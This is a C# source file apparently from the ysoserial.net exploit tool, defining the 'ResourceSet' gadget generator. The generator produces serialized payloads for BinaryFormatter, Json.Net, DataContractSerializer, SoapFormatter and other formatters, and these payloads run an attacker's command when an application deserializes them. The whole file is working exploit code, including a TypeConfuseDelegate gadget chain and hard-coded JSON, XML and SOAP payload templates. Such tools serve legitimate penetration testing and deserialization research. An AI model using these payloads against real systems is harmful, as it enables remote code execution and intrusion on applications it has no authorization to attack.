using System;
using System.Collections.Generic;
using System.IO;
using System.Resources;
using System.Text;
using ysoserial.Helpers;

namespace ysoserial.Generators
{
    class ResourceSetGenerator : GenericGenerator
    {
        public override string Description()
        {
            return "ResourceSet gadget (WARNING: your command will be executed at least once during payload generation)";
            // Although it looks similar to WindowsIdentityGenerator but "actor" does not work in this context 
        }

        public override List<string> SupportedFormatters()
        {
            return new List<string> { "BinaryFormatter", "ObjectStateFormatter", "NetDataContractSerializer", "SoapFormatter", "LosFormatter", "Json.Net", "DataContractSerializer" };
        }

        public override string Name()
        {
            return "ResourceSet";
        }

        public override string Finders()
        {
            return "Soroush Dalili";
        }

        public override List<string> Labels()
        {
            return new List<string> { GadgetTypes.BridgeAndDerived };
        }

        public override object Generate(string formatter, InputArgs inputArgs)
        {
            string resxPayload = Plugins.ResxPlugin.GetPayload("binaryformatter", inputArgs);
            MemoryStream ms = new MemoryStream(Encoding.ASCII.GetBytes(resxPayload));

            // TextFormattingRunPropertiesGenerator is the preferred method due to its short length. However, we need to insert it manually into a serialized object as ResourceSet cannot tolerate it 
            // TODO: surgical insertion!
            // object generatedPayload = TextFormattingRunPropertiesGenerator.TextFormattingRunPropertiesGadget(tempInputArgs);

            object generatedPayload = TypeConfuseDelegateGenerator.TypeConfuseDelegateGadget(inputArgs);

            using (ResourceWriter rw = new ResourceWriter(@".\ResourceSetGenerator.resources"))
            {
                rw.AddResource("", generatedPayload);
                rw.Generate();
                rw.Close();
            }

            ResourceReader myResourceReader = new ResourceReader(@".\ResourceSetGenerator.resources");

            // Payload will be executed once here which is annoying but without surgical insertion or something to parse binaryformatter objects, it is quite hard to prevent this
            ResourceSet myResourceSet = new ResourceSet(@".\ResourceSetGenerator.resources");
            
            if (formatter.Equals("binaryformatter", StringComparison.OrdinalIgnoreCase)
                || formatter.Equals("losformatter", StringComparison.OrdinalIgnoreCase)
                || formatter.Equals("objectstateformatter", StringComparison.OrdinalIgnoreCase)
                || formatter.Equals("netdatacontractserializer", StringComparison.OrdinalIgnoreCase)
                || formatter.Equals("soapformatter", StringComparison.OrdinalIgnoreCase))
            {
                return Serialize(myResourceSet, formatter, inputArgs);
            }
            else if (formatter.ToLower().Equals("json.net"))
            {

                string payload = "{'$type': 'System.Web.UI.MobileControls.SessionViewState+SessionViewStateHistoryItem, System.Web.Mobile, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a', 's':''}";

                if (inputArgs.Minify)
                {
                    // by default JsonSerializerSettings.TypeNameAssemblyFormat is set to Simple so we can remove the version etc from the assembly name
                    // see https://www.newtonsoft.com/json/help/html/P_Newtonsoft_Json_JsonSerializerSettings_TypeNameAssemblyFormat.htm
                    // if TypeNameAssemblyFormat == Full , then we have to keep the full name
                    payload = JSONMinifier.Minify(payload, new string[] { "System.Web.Mobile" }, null);
                }


                if (inputArgs.Test)
                {
                    try
                    {
                        SerializersHelper.JsonNet_deserialize(payload);
                    }
                    catch
                    {
                    }
                }
                return payload;
            }
            else if (formatter.ToLower().Equals("datacontractserializer"))
            {

                string payload = $@"<root type=""System.Web.UI.MobileControls.SessionViewState+SessionViewStateHistoryItem, System.Web.Mobile, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a""><SessionViewState.SessionViewStateHistoryItem xmlns:i=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:x=""http://www.w3.org/2001/XMLSchema"" xmlns:z=""http://schemas.microsoft.com/2003/10/Serialization/"" xmlns=""http://schemas.datacontract.org/2004/07/System.Web.UI.MobileControls"">
  <s i:type=""x:string"" xmlns=""""></s>
</SessionViewState.SessionViewStateHistoryItem></root>";

                if (inputArgs.Minify)
                {
                    payload = XMLMinifier.Minify(payload, null, null);
                }

                if (inputArgs.Test)
                {
                    try
                    {
                        SerializersHelper.DataContractSerializer_deserialize(payload, null, "root");
                    }
                    catch
                    {
                    }
                }
                return payload;
            }
            else if (formatter.ToLower().Equals("netdatacontractserializer"))
            {

                string payload = $@"<root><w xmlns:i=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:x=""http://www.w3.org/2001/XMLSchema"" z:Id=""1"" z:Type=""System.Web.UI.MobileControls.SessionViewState+SessionViewStateHistoryItem"" z:Assembly=""System.Web.Mobile, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a"" xmlns:z=""http://schemas.microsoft.com/2003/10/Serialization/"" xmlns="""">
  <s z:Type=""System.String"" z:Assembly=""0"" xmlns=""""></s>
</w></root>";

                if (inputArgs.Minify)
                {
                    payload = XMLMinifier.Minify(payload, null, null);
                }

                if (inputArgs.Test)
                {
                    try
                    {
                        SerializersHelper.NetDataContractSerializer_deserialize(payload, "root");
                    }
                    catch
                    {
                    }
                }
                return payload;
            }
            else if (formatter.ToLower().Equals("soapformatter"))
            {

                string payload = $@"<SOAP-ENV:Envelope xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:xsd=""http://www.w3.org/2001/XMLSchema"" xmlns:SOAP-ENC=""http://schemas.xmlsoap.org/soap/encoding/"" xmlns:SOAP-ENV=""http://schemas.xmlsoap.org/soap/envelope/"" xmlns:clr=""http://schemas.microsoft.com/soap/encoding/clr/1.0"" SOAP-ENV:encodingStyle=""http://schemas.xmlsoap.org/soap/encoding/"">
<SOAP-ENV:Body>
<a1:SessionViewState_x002B_SessionViewStateHistoryItem id=""ref-1"" xmlns:a1=""http://schemas.microsoft.com/clr/nsassem/System.Web.UI.MobileControls/System.Web.Mobile%2C%20Version%3D4.0.0.0%2C%20Culture%3Dneutral%2C%20PublicKeyToken%3Db03f5f7f11d50a3a"">
<s></s>
</a1:SessionViewState_x002B_SessionViewStateHistoryItem>
</SOAP-ENV:Body>
</SOAP-ENV:Envelope>
";

                if (inputArgs.Minify)
                {
                    payload = XMLMinifier.Minify(payload, null, null, FormatterType.SoapFormatter);
                }

                if (inputArgs.Test)
                {
                    try
                    {
                        SerializersHelper.SoapFormatter_deserialize(payload);
                    }
                    catch
                    {
                    }
                }
                return payload;
            }
            else
            {
                throw new Exception("Formatter not supported");
            }
        }
    }
}
